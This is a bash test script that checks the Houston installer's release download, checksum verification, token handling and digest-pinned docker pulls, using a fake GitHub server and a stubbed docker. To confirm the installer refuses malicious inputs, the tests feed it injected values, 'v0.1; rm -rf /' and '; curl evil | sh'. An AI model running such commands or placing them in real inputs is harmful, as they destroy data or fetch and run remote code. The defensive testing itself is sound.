#!/usr/bin/env bash
# Installing a released version (docs/plans/releases.md, rows 4-6), in a
# Debian container: install.sh loaded as a library (HOUSTON_INSTALL_LIB=1)
# against a fake GitHub (release JSON and assets, logging every request's
# Authorization header), with docker stubbed. Nothing here needs the network.
#   - neither HOUSTON_VERSION nor HOUSTON_SOURCE: the latest release; no
#     latest release to be found stops before anything changes
#   - both, a malformed version and an unknown one are refused before
#     anything changes
#   - a release's CLI is installed, checked against SHA256SUMS
#   - the token is sent when given, and nothing when not (a public repo)
#   - a checksum mismatch stops the install, and the old CLI stays
#   - the images are pulled by the digests in the release's IMAGES, checked
#     against SHA256SUMS; an IMAGES that doesn't match, or names other
#     images, stops the install before anything is pulled; a release from
#     before IMAGES is pulled by tag
#   - the token reaches docker login only on stdin, and is logged out after;
#     without one, no login at all
#
#   install/test/install-version.sh
set -uo pipefail

repo="$(cd "$(dirname "$0")/../.." && pwd)"
exec docker run --rm -i -v "$repo/install:/install:ro" debian:bookworm-slim bash -s <<'IN_CONTAINER'
set -uo pipefail
apt-get update -qq >/dev/null && apt-get install -y -qq --no-install-recommends curl python3 ca-certificates >/dev/null 2>&1

failures=0
ok() { printf '  ok    %s\n' "$*"; }
bad() { printf '  FAIL  %s\n' "$*"; failures=$((failures + 1)); }

# The fake GitHub: /repos/scttymn/houston/releases/tags/<tag> for v0.1.0
# (also the latest) and v0.0.9 (from before IMAGES), and their assets by id.
# Compact JSON, as the real API sends.
mkdir -p /fake/assets
printf 'houston v0.1.0 linux amd64\n' > /fake/assets/houston-linux-amd64
printf '#!/bin/sh\necho installer\n' > /fake/assets/install.sh
MC_DIGEST=sha256:$(printf mc | sha256sum | cut -c1-64)
RUNNER_DIGEST=sha256:$(printf runner | sha256sum | cut -c1-64)
printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$MC_DIGEST" "$RUNNER_DIGEST" > /fake/assets/IMAGES
sums() { (cd /fake/assets && sha256sum houston-linux-amd64 install.sh IMAGES > SHA256SUMS); }
sums
cat > /fake/server.py <<'PY'
import http.server, json, os, sys
PORT = int(sys.argv[1])
NAMES = ["houston-linux-amd64", "install.sh", "SHA256SUMS", "IMAGES"]
RELEASES = {"v0.1.0": NAMES, "latest": NAMES, "v0.0.9": NAMES[:3]}
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        with open("/fake/requests.log", "a") as f:
            f.write("%s auth=%s\n" % (self.path, self.headers.get("Authorization", "-")))
        base = "http://127.0.0.1:%d/repos/scttymn/houston/releases" % PORT
        release = self.path.rsplit("/", 1)[1]
        if self.path.startswith("/repos/scttymn/houston/releases/") and release in RELEASES:
            tag = "v0.1.0" if release == "latest" else release
            assets = [{"url": "%s/assets/%d" % (base, NAMES.index(n) + 1), "id": NAMES.index(n) + 1, "node_id": "x", "name": n,
                       "uploader": {"login": "github-actions[bot]", "url": "https://api.github.com/users/github-actions%5Bbot%5D"}}
                      for n in RELEASES[release]]
            body = json.dumps({"url": base + "/9", "assets_url": base + "/9/assets", "id": 9, "tag_name": tag, "name": tag, "assets": assets}, separators=(",", ":")).encode()
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers(); self.wfile.write(body)
        elif self.path.startswith("/repos/scttymn/houston/releases/assets/") and self.headers.get("Accept") == "application/octet-stream":
            name = NAMES[int(self.path.rsplit("/", 1)[1]) - 1]
            self.send_response(200); self.end_headers(); self.wfile.write(open("/fake/assets/" + name, "rb").read())
        else:
            self.send_response(404); self.end_headers(); self.wfile.write(b'{"message":"Not Found"}')
http.server.HTTPServer(("127.0.0.1", PORT), H).serve_forever()
PY
python3 /fake/server.py 8765 & sleep 1

# docker is a stub that logs its arguments, and what it reads on stdin for
# a login (the CLI step also pulls Kamal's image).
mkdir -p /stub && cat > /stub/docker <<'SH' && chmod 755 /stub/docker
#!/bin/sh
echo "docker $*" >> /fake/docker.log
[ "$1" = login ] && echo "stdin: $(cat)" >> /fake/docker.log
exit 0
SH
export PATH="/stub:$PATH"

# lib <env...> -- <commands>: install.sh's functions in a fresh subshell.
lib() { env HOUSTON_INSTALL_LIB=1 HOUSTON_GITHUB_API=http://127.0.0.1:8765 "$@" sh -c '. /install/install.sh; arch=amd64; '"$LIB_CMD"; }

echo "== refusals, before anything changes"
refused() { # refused <want> <env...>
  local want=$1; shift
  out=$(LIB_CMD='check_release; echo "not refused"' lib "$@" 2>&1); code=$?
  [ "$code" = 1 ] && printf '%s' "$out" | grep -qF "$want" && ok "exit 1: $(printf '%s' "$out" | tail -1)" || bad "wanted \"$want\", got exit $code: $out"
}
refused "set HOUSTON_VERSION or HOUSTON_SOURCE, not both" HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE=/src
refused "HOUSTON_VERSION must be a release tag like v0.1.0" HOUSTON_VERSION='v0.1; rm -rf /' HOUSTON_SOURCE=
refused "v9.9.9 isn't a Houston release" HOUSTON_VERSION=v9.9.9 HOUSTON_SOURCE=
refused "couldn't find Houston's latest release" HOUSTON_VERSION= HOUSTON_SOURCE= HOUSTON_REPO=scttymn/nothing
[ ! -e /usr/local/bin/houston ] && ok "nothing installed" || bad "something was installed"

echo "== neither HOUSTON_VERSION nor HOUSTON_SOURCE: the latest release"
out=$(LIB_CMD='check_release && echo "version=$HOUSTON_VERSION image=$IMAGE runner=$RUNNER_IMAGE"' lib HOUSTON_VERSION= HOUSTON_SOURCE= 2>&1); code=$?
[ "$code" = 0 ] && printf '%s' "$out" | grep -qx "version=v0.1.0 image=ghcr.io/scttymn/houston-mission-control:v0.1.0 runner=ghcr.io/scttymn/houston-runner:v0.1.0" &&
  ok "resolved the latest release, v0.1.0, and its images" || bad "exit $code: $out"

echo "== a release's CLI, checked against SHA256SUMS; no token: no Authorization"
: > /fake/requests.log
out=$(LIB_CMD='check_release && install_cli' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
[ "$code" = 0 ] && [ "$(cat /usr/local/bin/houston 2>/dev/null)" = "houston v0.1.0 linux amd64" ] && [ -x /usr/local/bin/houston ] &&
  ok "installed the release's houston-linux-amd64" || bad "exit $code: $out"
grep -q "auth=Bearer" /fake/requests.log && bad "sent an Authorization header without a token" || ok "no Authorization without a token"
grep -q "/releases/assets/1 " /fake/requests.log && grep -q "/releases/assets/3 " /fake/requests.log && ok "fetched the binary and SHA256SUMS by asset id" || bad "requests: $(cat /fake/requests.log)"

echo "== with a token: every request is authorized"
: > /fake/requests.log
out=$(LIB_CMD='check_release && install_cli' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= HOUSTON_GITHUB_TOKEN=ghp_test 2>&1); code=$?
[ "$code" = 0 ] && ! grep -qv "auth=Bearer ghp_test" /fake/requests.log && ok "all $(wc -l < /fake/requests.log) requests carried the token" || bad "exit $code: $(cat /fake/requests.log) $out"
printf '%s' "$out" | grep -q ghp_test && bad "the token was printed" || ok "the token isn't printed"

echo "== a checksum mismatch stops the install; the old CLI stays"
printf 'old houston\n' > /usr/local/bin/houston
printf 'tampered\n' > /fake/assets/houston-linux-amd64
out=$(LIB_CMD='check_release && install_cli' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
[ "$code" = 1 ] && printf '%s' "$out" | grep -qF "doesn't match the release's SHA256SUMS" && ok "exit 1: $(printf '%s' "$out" | tail -1)" || bad "exit $code: $out"
[ "$(cat /usr/local/bin/houston)" = "old houston" ] && ok "the old CLI is untouched" || bad "the CLI was replaced"

echo "== the release's images: pulled by digest; the token only on stdin, and logged out after"
: > /fake/docker.log
out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= HOUSTON_GITHUB_TOKEN=ghp_test 2>&1); code=$?
log=$(cat /fake/docker.log)
[ "$code" = 0 ] && printf '%s' "$log" | grep -qx "docker login ghcr.io -u houston --password-stdin" && printf '%s' "$log" | grep -qx "stdin: ghp_test" &&
  ok "logged in to ghcr.io with the token on stdin" || bad "exit $code: $log $out"
printf '%s' "$log" | grep -q "^docker .*ghp_test" && bad "the token was a docker argument" || ok "the token was never a docker argument"
printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-mission-control:v0.1.0@$MC_DIGEST" &&
  printf '%s' "$log" | grep -qx "docker pull --quiet ghcr.io/scttymn/houston-runner:v0.1.0@$RUNNER_DIGEST" && ok "pulled both images by the digests in IMAGES" || bad "pulls: $log"
[ "$(printf '%s' "$log" | tail -1)" = "docker logout ghcr.io" ] && ok "logged out after pulling" || bad "no logout: $log"
: > /fake/docker.log
out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
[ "$code" = 0 ] && ! grep -qE "docker (login|logout)" /fake/docker.log && grep -q "docker pull" /fake/docker.log && ok "no token: pulled without logging in" || bad "exit $code: $(cat /fake/docker.log)"

out=$(LIB_CMD='check_release && fetch_images && echo "image=$IMAGE runner=$RUNNER_IMAGE"' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1)
printf '%s' "$out" | grep -qx "image=ghcr.io/scttymn/houston-mission-control:v0.1.0@$MC_DIGEST runner=ghcr.io/scttymn/houston-runner:v0.1.0@$RUNNER_DIGEST" &&
  ok "compose.yml will name the images by digest" || bad "images: $out"

echo "== an IMAGES that doesn't check out stops the install before anything is pulled"
refused_images() { # refused_images <want>
  : > /fake/docker.log
  out=$(LIB_CMD='check_release && fetch_images; echo "not refused"' lib HOUSTON_VERSION=v0.1.0 HOUSTON_SOURCE= 2>&1); code=$?
  [ "$code" = 1 ] && printf '%s' "$out" | grep -qF "$1" && ! grep -q "docker pull" /fake/docker.log &&
    ok "exit 1, nothing pulled: $(printf '%s' "$out" | tail -1)" || bad "wanted \"$1\", got exit $code: $out; docker: $(cat /fake/docker.log)"
}
cp /fake/assets/IMAGES /fake/IMAGES.good
printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:%064d\n' 0 > /fake/assets/IMAGES
refused_images "IMAGES doesn't match the release's SHA256SUMS"
printf 'ghcr.io/someone-else/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$MC_DIGEST" "$RUNNER_DIGEST" > /fake/assets/IMAGES; sums
refused_images "IMAGES names ghcr.io/someone-else/houston-mission-control:v0.1.0@$MC_DIGEST"
printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@%s\nghcr.io/scttymn/houston-runner:v0.1.0\n' "$MC_DIGEST" > /fake/assets/IMAGES; sums
refused_images "IMAGES names ghcr.io/scttymn/houston-runner:v0.1.0"
printf 'ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:abc; curl evil | sh\nghcr.io/scttymn/houston-runner:v0.1.0@%s\n' "$RUNNER_DIGEST" > /fake/assets/IMAGES; sums
refused_images "IMAGES names ghcr.io/scttymn/houston-mission-control:v0.1.0@sha256:abc; curl evil | sh"
cp /fake/IMAGES.good /fake/assets/IMAGES; sums

echo "== a release from before IMAGES: pulled by tag"
: > /fake/docker.log
out=$(LIB_CMD='check_release && fetch_images' lib HOUSTON_VERSION=v0.0.9 HOUSTON_SOURCE= 2>&1); code=$?
[ "$code" = 0 ] && grep -qx "docker pull --quiet ghcr.io/scttymn/houston-mission-control:v0.0.9" /fake/docker.log &&
  printf '%s' "$out" | grep -qF "v0.0.9 lists no image digests" && ok "pulled by tag, and said so" || bad "exit $code: $out $(cat /fake/docker.log)"

echo
if [ "$failures" -eq 0 ]; then echo "INSTALL VERSION PASS"; else echo "INSTALL VERSION: $failures failure(s)"; exit 1; fi
IN_CONTAINER
